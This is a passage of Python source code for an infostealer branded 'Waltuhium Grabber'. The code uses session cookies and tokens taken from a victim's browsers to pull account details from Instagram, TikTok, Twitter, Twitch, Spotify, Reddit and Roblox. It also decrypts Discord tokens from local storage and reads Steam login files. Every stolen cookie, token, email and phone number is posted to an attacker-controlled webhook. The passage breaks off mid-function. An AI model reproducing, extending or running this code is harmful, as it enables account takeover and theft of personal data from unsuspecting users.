                    "embeds": [embed_data]
                }
                headers = {
                    "Content-Type": "application/json"
                }
                async with session.post(webhook, json=payload, headers=headers) as response:
                    pass
        except:
            pass
        else:
            Variables.RiotGameAccounts.append(f'Username : {username}\nEmail : {email}\nRegion : {region}\nLocale : {locale}\nCountry : {country}\nMFA Enabled : {mfa}\nCookie : {cookie}\n======================================================================\n')
    async def InstaSession(self, cookie, browser:str) -> None:
        try:
            pp = "https://cdn.discordapp.com/attachments/1192191430827970571/1196865524919975976/68747470733a2f2f63646e2e646973636f72646170702e636f6d2f6174746163686d656e74732f313133383134313739313736363435383530392f313134373536383733383636353737393332322f494d475f393136312d72656d6f766562672d707265766965772e70.png"
            bio = ""
            fullname = ""
            headers = {
                    "user-agent": "Instagram 219.0.0.12.117 Android",
                    "cookie": f"sessionid={cookie}"
                }
            infoURL = 'https://i.instagram.com/api/v1/accounts/current_user/?edit=true'

            async with aiohttp.ClientSession(headers=headers, connector=aiohttp.TCPConnector(ssl=True)) as session:
                async with session.get(infoURL) as response:
                    data = await response.json()
                async with session.get(f"https://i.instagram.com/api/v1/users/{data['user']['pk']}/info/") as response:
                    data2 = await response.json()                

            try:
                pp = data["user"]["profile_pic_url"]
            except:
                pass

            username = data["user"]["username"]
            profileURL = "https://instagram.com/" + username

            if data["user"]["biography"] == "":
                bio = "No bio"
            else:
                bio = data["user"]["biography"]
            bio = bio.replace("\n", ", ")
            if data["user"]["full_name"] == "":
                fullname = "No nickname"
            else:
                fullname = data["user"]["full_name"]

            email = data["user"]["email"]
            verify = data["user"]["is_verified"]
            followers = data2["user"]["follower_count"]
            following = data2["user"]["following_count"]
            embed_data = {
                "title": "***Waltuhium Grabber***",
                "description": f"***Waltuhium Instagram Session was detected on the {browser} browser***",
                "url" : "https://t.me/waltuhium",
                "color": 0,
                "footer": {"text": "https://t.me/waltuhium | https://github.com/waltuhium23/waltuhium"},
                "thumbnail": {"url": pp}}
            fields = [
                {"name": "Username", "value": "``" + username + "``", "inline": True},
                {"name": "Nick Name", "value": "``" + fullname + "``", "inline": True},
                {"name": "Email", "value": "``" +  email + "``", "inline": True},
                {"name": "is Verified", "value": "``" + str(verify) + "``", "inline": True},
                {"name": "Followers", "value":"``" + str(followers) + "``", "inline": True},
                {"name": "Following", "value": "``" + str(following) + "``", "inline": True},
                {"name": "Profile URL", "value": "``" + profileURL + "``", "inline": False},
                {"name": "Biography", "value": "``" + bio + "``", "inline": False},
                {"name": "Cookie", "value": "``" + cookie + "``", "inline": False},]
            embed_data["fields"] = fields
            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                payload = {
                    "username": "waltuhium | t.me/waltuhium",
                    "embeds": [embed_data]
                }
                headers = {
                    "Content-Type": "application/json"
                }
                async with session.post(webhook, json=payload, headers=headers) as response:
                    pass
            
        except Exception as e:
            print(str(e))
        else:
            Variables.InstagramAccounts.append(f"Cookie : {cookie}\nProfile URL : {profileURL}\nUsername : {username}\nNick Name : {fullname}\nis Verified : {verify}\nEmail : {email}\nFollowers : {followers}\nFollowing : {following}\nBiography : {bio}\n======================================================================\n")
    async def TikTokSession(self, cookie, browser:str) -> None:
        try:
            email = ''
            phone = ''
            cookies = "sessionid=" + cookie
            headers = {"cookie": cookies, "Accept-Encoding": "identity"}
            headers2 = {"cookie": cookies}
            url = 'https://www.tiktok.com/passport/web/account/info/?aid=1459&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&device_platform=web_pc&focus_state=true&from_page=fyp&history_len=2&is_fullscreen=false&is_page_visible=true&os=windows&priority_region=DE&referer=&region=DE&screen_height=1080&screen_width=1920&tz_name=Europe%2FBerlin&webcast_language=de-DE'
            url2 = 'https://webcast.tiktok.com/webcast/wallet_api/diamond_buy/permission/?aid=1988&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true'
            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                async with session.get(url, headers=headers) as response:
                    data = await response.json()
                async with session.get(url2, headers=headers2) as response2:
                    data2 = await response2.json()

            user_id = data["data"]["user_id"]
            if not data["data"]["email"]:
                email = "No Email"
            else:
                email = data["data"]["email"]
            if not data["data"]["mobile"]:
                phone = "No number"
            else:
                phone = data["data"]["mobile"]
            username = data["data"]["username"]
            coins = data2["data"]["coins"]

            embed_data = {
                "title": "***Waltuhium Grabber***",
                "description": f"***Waltuhium Tiktok Session was detected on the {browser} browser***",
                "url" : "https://t.me/waltuhium",
                "color": 0,
                "footer": {"text": "https://t.me/waltuhium | https://github.com/waltuhium23/waltuhium"},
                "thumbnail": {"url": "https://cdn.discordapp.com/attachments/1192191430827970571/1196865524919975976/68747470733a2f2f63646e2e646973636f72646170702e636f6d2f6174746163686d656e74732f313133383134313739313736363435383530392f313134373536383733383636353737393332322f494d475f393136312d72656d6f766562672d707265766965772e70.png"}}
            fields = [
                {"name": "Username", "value": "``" + username + "``", "inline": True},
                {"name": "Email", "value": "``" + email + "``", "inline": True},
                {"name": "Phone", "value": "``" +  str(phone) + "``", "inline": True},
                {"name": "User identifier", "value": "``" + str(user_id) + "``", "inline": True},
                {"name": "Coins", "value":"``" + str(coins) + "``", "inline": True},
                {"name": "Profile URL", "value": "``" + f'https://tiktok.com/@{username}' + "``", "inline": False},
                {"name": "Tiktok Cookie", "value": "``" + cookie + "``", "inline": False},]
            embed_data["fields"] = fields
            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                payload = {
                    "username": "waltuhium | t.me/waltuhium",
                    "embeds": [embed_data]
                }
                headers = {
                    "Content-Type": "application/json"
                }
                async with session.post(webhook, json=payload, headers=headers) as response:
                    pass
        except:
            pass
        else:
            Variables.TikTokAccounts.append(f"Cookie : {cookies}\nUser identifier : {user_id}\nProfile URL : https://tiktok.com/@{username}\nUsername : {username}\nEmail : {email}\nPhone : {phone}\nCoins : {coins}\n======================================================================\n")

    async def TwitterSession(self, cookie, browser:str) -> None:
        try:
            description = ''
            authToken = f'{cookie};ct0=ac1aa9d58c8798f0932410a1a564eb42'
            headers = {
                'authority': 'twitter.com',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'authorization': 'Bearer AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA',
                'origin': 'https://twitter.com',
                'referer': 'https://twitter.com/home',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'sec-gpc': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
                'x-twitter-active-user': 'yes',
                'x-twitter-auth-type': 'OAuth2Session',
                'x-twitter-client-language': 'en',
                'x-csrf-token': 'ac1aa9d58c8798f0932410a1a564eb42',
                "cookie" : f'auth_token={authToken}'
            }
            url = "https://twitter.com/i/api/1.1/account/update_profile.json"

            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                async with session.post(url, headers=headers) as response:
                    req = await response.json()
            
            
            try:
                if req["description"] == "":
                    description = "There is no bio"
                else:
                    description = req["description"]
            except:
                description = "There is no biography"
            description = description.replace("\n", ", ")
            pp = req["profile_image_url_https"]
            username = req["name"]
            nickname = req["screen_name"]
            profileURL = "https://twitter.com/" + username
            embed_data = {
                "title": "***Waltuhium Grabber***",
                "description": f"***Waltuhium Twitter Session was detected on the {browser} browser***",
                "url" : "https://t.me/waltuhium",
                "color": 0,
                "footer": {"text": "https://t.me/waltuhium | https://github.com/waltuhium23/waltuhium"},
                "thumbnail": {"url": pp}}
            fields = [
                {"name": "Username", "value": "``" + username + "``", "inline": True},
                {"name": "Screen Name", "value": "``" + nickname + "``", "inline": True},
                {"name": "Followers", "value": "``" +  str(req['followers_count']) + "``", "inline": True},
                {"name": "Following", "value": "``" + str(req['friends_count']) + "``", "inline": True},
                {"name": "Tweets", "value":"``" + str(req['statuses_count']) + "``", "inline": True},
                {"name": "Is Verified", "value": "``" + str(req['verified']) + "``", "inline": True},
                {"name": "Created At", "value": "``" + str(req['created_at']) + "``", "inline": True},
                {"name": "Biography", "value": "``" + str(description) + "``", "inline": False},
                {"name": "Profile URL", "value": "``" + str(profileURL) + "``", "inline": False},
                {"name": "Cookie", "value": "``" + str(cookie) + "``", "inline": False},
                ]
            embed_data["fields"] = fields
            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                payload = {
                    "username": "waltuhium | t.me/waltuhium",
                    "embeds": [embed_data]
                }
                headers = {
                    "Content-Type": "application/json"
                }
                async with session.post(webhook, json=payload, headers=headers) as response:
                    pass
            
            Variables.TwitterAccounts.append(f"Username : {username}\nScreen Name : {nickname}\nFollowers : {req['followers_count']}\nFollowing : {req['friends_count']}\nTweets : {req['statuses_count']}\nVerified : {req['verified']}\nCreated At : {req['created_at']}\nProfile URL : {profileURL}\nCookie : {cookie}\nBiography : {description}\n=====================================================\n")
        except Exception as e:
            print(str(e))

    
    async def TwitchSession(self, auth_token, username, browser:str) -> None:
        try:
            url = 'https://gql.twitch.tv/gql'
            headers = {
                'Authorization': f'OAuth {auth_token}',
            }

            query = f"""
            query {{
                user(login: "{username}") {{
                    id
                    login
                    displayName
                    email
                    hasPrime
                    isPartner
                    language
                    profileImageURL(width: 300)
                    bitsBalance
                    followers {{
                        totalCount
                    }}
                }}
            }}"""

            data = {
                "query": query
            }

            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                async with session.post(url, headers=headers, json=data) as response:
                    if response.status == 200:
                        response_data = await response.json()
            data = response_data["data"]["user"]
            id = data["id"]
            login = data["login"]
            acc_url = f"https://www.twitch.tv/{login}"
            displayName = data["displayName"]
            email = data["email"]
            hasPrime = data["hasPrime"]
            isPartner = data["isPartner"]
            lang = data["language"]
            pp = 'https://cdn.discordapp.com/attachments/1192191430827970571/1196865524919975976/68747470733a2f2f63646e2e646973636f72646170702e636f6d2f6174746163686d656e74732f313133383134313739313736363435383530392f313134373536383733383636353737393332322f494d475f393136312d72656d6f766562672d707265766965772e70.png'
            try:
                pp = data["profileImageURL"]
            except:pass
            bits = data["bitsBalance"]
            followers = data["followers"]["totalCount"]
            embed_data = {
                "title": "***Waltuhium Grabber***",
                "description": f"***Waltuhium Twitch Session was detected on the {browser} browser***",
                "url" : "https://t.me/waltuhium",
                "color": 0,
                "footer": {"text": "https://t.me/waltuhium | https://github.com/waltuhium23/waltuhium"},
                "thumbnail": {"url": pp}}
            fields = [
                {"name": "Username", "value": "``" + str(login) + "``", "inline": True},
                {"name": "Display Name", "value": "``" + str(displayName) + "``", "inline": True},
                {"name": "Email", "value": "``" +  str(email) + "``", "inline": True},
                {"name": "ID", "value": "``" + str(id) + "``", "inline": True},
                {"name": "Has Prime?", "value":"``" + str(hasPrime) + "``", "inline": True},
                {"name": "is Partner?", "value": "``" + str(isPartner) + "``", "inline": True},
                {"name": "Language", "value": "``" + str(lang) + "``", "inline": True},
                {"name": "Bit", "value": "``" + str(bits) + "``", "inline": True},
                {"name": "Followers", "value": "``" + str(followers) + "``", "inline": True},
                {"name": "Profile URL", "value": "``" + str(acc_url) + "``", "inline": False},
                {"name": "Cookie", "value": "``" + str(auth_token) + "``", "inline": False},]
            embed_data["fields"] = fields
            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                payload = {
                    "username": "waltuhium | t.me/waltuhium",
                    "embeds": [embed_data]
                }
                headers = {
                    "Content-Type": "application/json"
                }
                async with session.post(webhook, json=payload, headers=headers) as response:
                    pass
        except:
            pass
        else:
            Variables.TwtichAccounts.append(f"Cookie : {auth_token}\nProfile URL : {acc_url}\nID : {id}\nUsername : {login}\nDisplay Name : {displayName}\nEmail : {email}\nHas Prime : {hasPrime}\nis Partner : {isPartner}\nLanguage : {lang}\nBits : {bits}\nFollowers : {followers}\n======================================================================\n")
    async def SpotifySession(self, cookie, browser:str) -> None:
        try:
            url = 'https://www.spotify.com/api/account-settings/v1/profile'

            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36',
                'Cookie': (
                    f'sp_dc={cookie}'
                )
            }

            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                async with session.get(url, headers=headers) as response:
                    data = await response.text()
                    data = json.loads(data)["profile"]


            email = data["email"]
            gender = data["gender"]
            birthdate = data["birthdate"]
            country = data["country"]
            username = data["username"]
            embed_data = {
                "title": "***Waltuhium Grabber***",
                "description": f"***Waltuhium Spotify Session was detected on the {browser} browser***",
                "url" : "https://t.me/waltuhium",
                "color": 0,
                "footer": {"text": "https://t.me/waltuhium | https://github.com/waltuhium23/waltuhium"},
                "thumbnail": {"url": "https://cdn.discordapp.com/attachments/1192191430827970571/1196865524919975976/68747470733a2f2f63646e2e646973636f72646170702e636f6d2f6174746163686d656e74732f313133383134313739313736363435383530392f313134373536383733383636353737393332322f494d475f393136312d72656d6f766562672d707265766965772e70.png"}}
            fields = [
                {"name": "Email", "value": "``" + str(email) + "``", "inline": True},
                {"name": "Username", "value": "``" + str(username) + "``", "inline": True},
                {"name": "Gender", "value": "``" +  str(gender) + "``", "inline": True},
                {"name": "Birthdate", "value": "``" + str(birthdate) + "``", "inline": True},
                {"name": "Country", "value":"``" + str(country) + "``", "inline": True},
                {"name": "Profile URL", "value": "``" + str(f'https://open.spotify.com/user/{username}') + "``", "inline": False},
                {"name": "Spotify Cookie", "value": "``" + str(cookie) + "``", "inline": False},]
            embed_data["fields"] = fields
            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                payload = {
                    "username": "waltuhium | t.me/waltuhium",
                    "embeds": [embed_data]
                }
                headers = {
                    "Content-Type": "application/json"
                }
                async with session.post(webhook, json=payload, headers=headers) as response:
                    pass
        except:
            pass
        else:
            Variables.SpotifyAccounts.append(f"Cookie : {cookie}\nProfile URL : https://open.spotify.com/user/{username}\nEmail : {email}\nUsername : {username}\nGender : {gender}\nBirthdate : {birthdate}\nCountry : {country}\n======================================================================\n")
    async def RedditSession(self, cookie, browser:str) -> None:
        try:
            gmail = ""
            cookies = "reddit_session=" + cookie
            headers = {
                    "cookie": cookies,
                    "Authorization": "Basic b2hYcG9xclpZdWIxa2c6"
                }
            jsonData = {"scopes": ["*", "email", "pii"]}
            Url = 'https://accounts.reddit.com/api/access_token'
            Url2 = 'https://oauth.reddit.com/api/v1/me'
                
            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                async with session.post(Url, headers=headers, json=jsonData) as res:
                    response =  await res.json()
                    accessToken = response["access_token"]
                    headers2 = {
                                'User-Agent': 'android:com.example.myredditapp:v1.2.3',
                                "Authorization": "Bearer " + accessToken}
                    async with session.get(Url2, headers=headers2) as sex:
                        data2 = await sex.json()
                    if data2["email"] == "":
                        gmail = "No email"
                    else:
                        gmail = data2["email"]
                    
                    pp = data2["icon_img"]
                    username = data2["name"]
                    profileUrl = 'https://www.reddit.com/user/' + username
                    commentKarma = data2["comment_karma"]
                    totalKarma = data2["total_karma"]
                    coins = data2["coins"]
                    mod = data2["is_mod"]
                    gold = data2["is_gold"]
                    suspended = data2["is_suspended"]
                    
            embed_data = {
                "title": "***Waltuhium Grabber***",
                "description": f"***Waltuhium Reddit Session was detected on the {browser} browser***",
                "url" : "https://t.me/waltuhium",
                "color": 0,
                "footer": {"text": "https://t.me/waltuhium | https://github.com/waltuhium23/waltuhium"},
                "thumbnail": {"url": pp}}
            fields = [
                {"name": "Username", "value": "``" + str(username) + "``", "inline": True},
                {"name": "Email", "value": "``" + str(gmail) + "``", "inline": True},
                {"name": "Comment Karma", "value": "``" +  str(commentKarma) + "``", "inline": True},
                {"name": "Total Karma", "value": "``" + str(totalKarma) + "``", "inline": True},
                {"name": "Coins", "value":"``" + str(coins) + "``", "inline": True},
                {"name": "Is Mod", "value": "``" + str(mod) + "``", "inline": True},
                {"name": "Is Gold", "value": "``" + str(gold) + "``", "inline": True},
                {"name": "Suspended", "value": "``" + str(suspended) + "``", "inline": True},
                {"name": "Profile URL", "value": "``" + str(profileUrl) + "``", "inline": False},
                {"name": "Cookie", "value": "``" + str(cookie) + "``", "inline": False},
                ]
            embed_data["fields"] = fields
            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                payload = {
                    "username": "waltuhium | t.me/waltuhium",
                    "embeds": [embed_data]
                }
                headers = {
                    "Content-Type": "application/json"
                }
                async with session.post(webhook, json=payload, headers=headers) as response:
                    pass
        except:
            pass
        else:
            Variables.RedditAccounts.append(f"Cookie : {cookies}\nProfile URL : {profileUrl}\nUsername : {username}\nEmail : {gmail}\nComment Karma : {commentKarma}\nTotal Karma : {totalKarma}\nis Mod : {mod}\nis Gold : {gold}\nSuspended : {suspended}\n======================================================================\n")
    async def RobloxSession(self, cookie, browser:str) -> None:
        try:
            headers = {'cookie':f'.ROBLOSECURITY={cookie}',"Accept-Encoding": "identity"}
            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                async with session.get("https://www.roblox.com/my/account/json",headers=headers) as response:
                    res = await response.json()
                async with session.get(f"https://economy.roblox.com/v1/users/{str(res['UserId'])}/currency",headers=headers) as req:
                    res2 = await req.json()
                async with session.get(f"https://thumbnails.roblox.com/v1/users/avatar?userIds={str(res['UserId'])}&size=420x420&format=Png&isCircular=false",headers=headers) as req2:
                    res3 = await req2.json()
                id = res["UserId"]
                name = res["Name"]
                DisplayName = res["DisplayName"]
                email = res["UserEmail"]
                isEmailVerified = res["IsEmailVerified"]
                robux = res2["robux"]
                pp = res3["data"][0]["imageUrl"]
                embed_data = {
                    "title": "***Waltuhium Grabber***",
                    "description": f"***Waltuhium Roblox Session was detected on the {browser} browser***",
                    "url" : "https://t.me/waltuhium",
                    "color": 0,
                    "footer": {"text": "https://t.me/waltuhium | https://github.com/waltuhium23/waltuhium"},
                    "thumbnail": {"url": pp}}
                fields = [
                    {"name": "Name", "value": "``" + str(name) + "``", "inline": True},
                    {"name": "Display Name", "value": "``" + str(DisplayName) + "``", "inline": True},
                    {"name": "Email", "value": "``" +  str(email) + "``", "inline": True},
                    {"name": "ID", "value": "``" + str(id) + "``", "inline": True},
                    {"name": "Email Verified?", "value": "``" + str(isEmailVerified) + "``", "inline": True},
                    {"name": "Robux", "value": "``" + str(robux) + "``", "inline": True},
                    {"name": "Cookie", "value": "```" + str(cookie) + "```", "inline": True},]
                embed_data["fields"] = fields
                payload = {
                    "username": "waltuhium | t.me/waltuhium",
                    "embeds": [embed_data]
                }
                headers2 = {
                    "Content-Type": "application/json"
                }
                async with session.post(webhook, json=payload, headers=headers2) as response:
                    pass
        except:
            pass
        else:
            Variables.RobloxAccounts.append(f"Name : {str(name)}\nDisplay Name : {str(DisplayName)}\nEmail : {str(email)}\nID : {str(id)}\nEmail Verified : {str(isEmailVerified)}\nRobux : {str(robux)}\nCookie : {cookie}\n======================================================================\n")
    async def GetTokens(self) -> None:
        try:
            discord_dirs = {
                "Discord" : os.path.join(self.RoamingAppData, "discord", "Local Storage", "leveldb"),
                "Discord Canary" : os.path.join(self.RoamingAppData, "discordcanary", "Local Storage", "leveldb"),
                "Lightcord" : os.path.join(self.RoamingAppData, "Lightcord", "Local Storage", "leveldb"),
                "Discord PTB" : os.path.join(self.RoamingAppData, "discordptb", "Local Storage", "leveldb"),
            }
            dirs = list()
            for r, discord_dir in discord_dirs.items():
                if os.path.isdir(discord_dir):
                    dirs.append(discord_dir)
            for x in self.profiles_full_path:
                if not x.endswith("leveldb"):
                    new_path = os.path.join(x, "Local Storage","leveldb")
                    if os.path.isdir(new_path):
                        dirs.append(new_path)
            for directorys in dirs:
                full_tokens = Variables.FullTokens
                if "cord" in directorys:  # extract tokens from discord 
                    key = SubModules.GetKey(directorys.replace(r"Local Storage\leveldb", "Local State"))
                    for y in os.listdir(directorys):
                        full_path = os.path.join(directorys, y)
                        if full_path[-3:] in ["log", "ldb"]:
                            with open(full_path, "r", encoding="utf-8", errors="ignore") as files:
                                for tokens in re.findall(r"dQw4w9WgXcQ:[^\"]*", files.read()):
                                    if tokens:
                                        enc_token = base64.b64decode(tokens.split("dQw4w9WgXcQ:")[1])
                                        dec_token = SubModules.Decrpytion(enc_token, key)
                                        if not dec_token in full_tokens:
                                            full_tokens.append(dec_token)
                                            await self.ValidateTokenAndGetInfo(dec_token)
                                        else:
                                            continue                                      
                else: # extract tokens from browsers
                    for x in os.listdir(directorys):
                        file_name = os.path.join(directorys, x)
                        if file_name[-3:] in ["log", "ldb"]:
                            with open(file_name, "r" ,encoding="utf-8", errors="ignore") as file:
                                for token in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", file.read()):
                                    if token:
                                        if not token in full_tokens:
                                            full_tokens.append(token)
                                            await self.ValidateTokenAndGetInfo(token)
                                        else:
                                            continue
        except:
            pass
    def calc_flags(self, flags: int) -> list:
        flags_dict = {
                "DISCORD_EMPLOYEE": {
                    "emoji": "<:staff:968704541946167357>",
                    "shift": 0,
                    "ind": 1
                },
                "DISCORD_PARTNER": {
                    "emoji": "<:partner:968704542021652560>",
                    "shift": 1,
                    "ind": 2
                },
                "HYPESQUAD_EVENTS": {
                    "emoji": "<:hypersquad_events:968704541774192693>",
                    "shift": 2,
                    "ind": 4
                },
                "BUG_HUNTER_LEVEL_1": {
                    "emoji": "<:bug_hunter_1:968704541677723648>",
                    "shift": 3,
                    "ind": 4
                },
                "HOUSE_BRAVERY": {
                    "emoji": "<:hypersquad_1:968704541501571133>",
                    "shift": 6,
                    "ind": 64
                },
                "HOUSE_BRILLIANCE": {
                    "emoji": "<:hypersquad_2:968704541883261018>",
                    "shift": 7,
                    "ind": 128
                },
                "HOUSE_BALANCE": {
                    "emoji": "<:hypersquad_3:968704541874860082>",
                    "shift": 8,
                    "ind": 256
                },
                "EARLY_SUPPORTER": {
                    "emoji": "<:early_supporter:968704542126510090>",
                    "shift": 9,
                    "ind": 512
                },
                "BUG_HUNTER_LEVEL_2": {
                    "emoji": "<:bug_hunter_2:968704541774217246>",
                    "shift": 14,
                    "ind": 16384
                },
                "VERIFIED_BOT_DEVELOPER": {
                    "emoji": "<:verified_dev:968704541702905886>",
                    "shift": 17,
                    "ind": 131072
                },
                "ACTIVE_DEVELOPER": {
                    "emoji": "<:Active_Dev:1045024909690163210>",
                    "shift": 22,
                    "ind": 4194304
                },
                "CERTIFIED_MODERATOR": {
                    "emoji": "<:certified_moderator:988996447938674699>",
                    "shift": 18,
                    "ind": 262144
                },
                "SPAMMER": {
                    "emoji": "⌨",
                    "shift": 20,
                    "ind": 1048704
                },
            }

        return [[flags_dict[flag]['emoji'], flags_dict[flag]['ind']] for flag in flags_dict if int(flags) & (1 << flags_dict[flag]["shift"])]
    def calc_flags2(self, flags : int) -> list:
        flags_dict = {
                "DISCORD_EMPLOYEE": {
                    "emoji": "<:staff:968704541946167357>",
                    "shift": 0,
                    "ind": 1
                },
                "DISCORD_PARTNER": {
                    "emoji": "<:partner:968704542021652560>",
                    "shift": 1,
                    "ind": 2
                },
                "BUG_HUNTER_LEVEL_1": {
                    "emoji": "<:bug_hunter_1:968704541677723648>",
                    "shift": 3,
                    "ind": 4
                },
                "EARLY_SUPPORTER": {
                    "emoji": "<:early_supporter:968704542126510090>",
                    "shift": 9,
                    "ind": 512
                },
                "VERIFIED_BOT_DEVELOPER": {
                    "emoji": "<:verified_dev:968704541702905886>",
                    "shift": 17,
                    "ind": 131072
                },
                "ACTIVE_DEVELOPER": {
                    "emoji": "<:active_dev:1045024909690163210>",
                    "shift": 22,
                    "ind": 4194304
                },
                "CERTIFIED_MODERATOR": {
                    "emoji": "<:certified_moderator:988996447938674699>",
                    "shift": 18,
                    "ind": 262144
                },
                "SPAMMER": {
                    "emoji": "⌨",
                    "shift": 20,
                    "ind": 1048704
                },
            }

        return [[flags_dict[flag]['emoji'], flags_dict[flag]['ind']] for flag in flags_dict if int(flags) & (1 << flags_dict[flag]["shift"])]
    async def ValidateTokenAndGetInfo(self, token:str) -> None:
        try:
            headers = {
            'Authorization' : token
        }
            acc_info = 'https://discord.com/api/v8/users/@me'
            hq_friends_url = 'https://discord.com/api/v8/users/@me/relationships'
            pp = None
            async with aiohttp.ClientSession() as session:
                async with session.get(acc_info, headers=headers) as response:
                    if response.status == 200:
                        Variables.ValidatedTokens.append(token)
                        data = await response.json()

                        avatar = data.get("avatar", "")
                        public_flags = data.get('public_flags', [])
                        badges = ' '.join([flag[0] for flag in self.calc_flags(public_flags)])
                        premium_type = data.get("premium_type", "")
                        if avatar:
                            async with session.get(f"https://cdn.discordapp.com/avatars/{data['id']}/{avatar}.png", headers=headers) as av:
                                if av.status == 200:
                                    pp = f"https://cdn.discordapp.com/avatars/{data['id']}/{avatar}.png"
                                else:
                                    pp = f"https://cdn.discordapp.com/avatars/{data['id']}/{avatar}.gif"
                        async with session.get(hq_friends_url, headers=headers) as response2:
                            friend_data = await response2.json()
                    else:
                        return
            
            nitroType = "No Nitro"
            try:
                if premium_type == 0:
                    nitroType='None'
                elif premium_type == 1:
                    nitroType = 'Nitro Classic'
                elif premium_type == 2:
                    nitroType = 'Nitro'
                elif premium_type == 3:
                    nitroType = 'Nitro Basic'
                else:
                    nitroType = 'None'
            except:
                pass
            hq_friends = []
            try:
                if friend_data:
                    for friend in friend_data:
                        unprefered_flags = [64, 128, 256, 1048704]
                        inds = [flag[1] for flag in self.calc_flags2(friend['user']['public_flags'])[::-1]]
                        for flag in unprefered_flags:
                            inds.remove(flag) if flag in inds else None
                        if inds != []:
                            hq_badges = ' '.join([flag[0] for flag in self.calc_flags2(friend['user']['public_flags'])[::-1]])
                            hq_data = f"{hq_badges} - ``{friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})``"
                            if len('\n'.join(hq_friends)) + len(data) >= 1024:
                                break   
                            hq_friends.append(hq_data)
                            if len(hq_friends) > 0:
                                hq_friends = '\n'.join(hq_friends)
            except:
                pass

            if data:
                embed_data = {
                "title": "***Waltuhium Grabber***",
                "description": f"***Waltuhium Validated Discord Token Detected***",
                "url" : "https://t.me/waltuhium",
                "color": 0,
                "footer": {"text": "https://t.me/waltuhium | https://github.com/waltuhium23/waltuhium"},
                "thumbnail": {"url": ""}}
                if pp:
                    embed_data["thumbnail"]["url"] = pp
                bio = str(data['bio'])
                bio = bio.replace("\n", ", ")

                fields = [
                    {"name": "Token", "value": "``" + str(token) + "``", "inline": False},
                    {"name": "Username", "value": "``" + str(f'{data["username"]}#{data["discriminator"]}') + "``", "inline": True},
                    {"name": "Email", "value": "``" + str(data['email']) + "``", "inline": True},
                    {"name": "ID", "value": "``" +  str(data["id"]) + "``", "inline": True},
                    {"name": "Phone", "value": "``" + str(data['phone']) + "``", "inline": True},
                    {"name": "MFA Enabled?", "value":"``" + str(data['mfa_enabled']) + "``", "inline": True},
                    {"name": "Nitro Type", "value": "``" + str(nitroType) + "``", "inline": True},
                    {"name": "Badges", "value": str(badges if badges != '' else 'None'), "inline": True},]
                if hq_friends:
                    try:
                        fields.append({"name": "Hq Friends", "value":  hq_friends, "inline": False},)
                    except:
                        pass
                embed_data["fields"] = fields
                async with aiohttp.ClientSession() as session:
                    payload = {
                        "username": "waltuhium | t.me/waltuhium",
                        "embeds": [embed_data]
                    }
                    headers = {
                        "Content-Type": "application/json"
                    }
                    async with session.post(webhook, json=payload, headers=headers) as response:
                        pass
                Variables.DiscordAccounts.append(f"Username : {data['username']}#{data['discriminator']}\nEmail : {data['email']}\nID : {data['id']}\nPhone : {str(data['phone'])}\nMFA Enabled : {data['mfa_enabled']}\nNitro Type : {nitroType}\nToken : {token}\nBiography : {bio}\n======================================================================\n")

        except Exception as e:
            print(e)

    async def GetSteamSession(self) -> None:
        try:
            all_disks = []
            for drive in range(ord('A'), ord('Z')+1):
                drive_letter = chr(drive)
                if os.path.exists(drive_letter + ':\\'):
                    all_disks.append(drive_letter)
            for steam_paths in all_disks:
                steam_paths = os.path.join(steam_paths + ":\\", "Program Files (x86)", "Steam", "config", "loginusers.vdf")
                if os.path.isfile(steam_paths):
                    with open(steam_paths, "r", encoding="utf-8", errors="ignore") as file:
                        steamid = "".join(re.findall(r"7656[0-9]{13}", file.read()))
                        if steamid:
                            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                                url1 = "https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key=440D7F4D810EF9298D25EDDF37C1F902&steamids=" + steamid
                                url2 = "https://api.steampowered.com/IPlayerService/GetSteamLevel/v1/?key=440D7F4D810EF9298D25EDDF37C1F902&steamid=" + steamid
                                async with session.get(url1) as req:
                                    response = await req.json()
                                async with session.get(url2) as req2:
                                    response2 = await req2.json()
                                player_data = response["response"]["players"][0]
                                personname = player_data["personaname"]
                                profileurl = player_data["profileurl"]
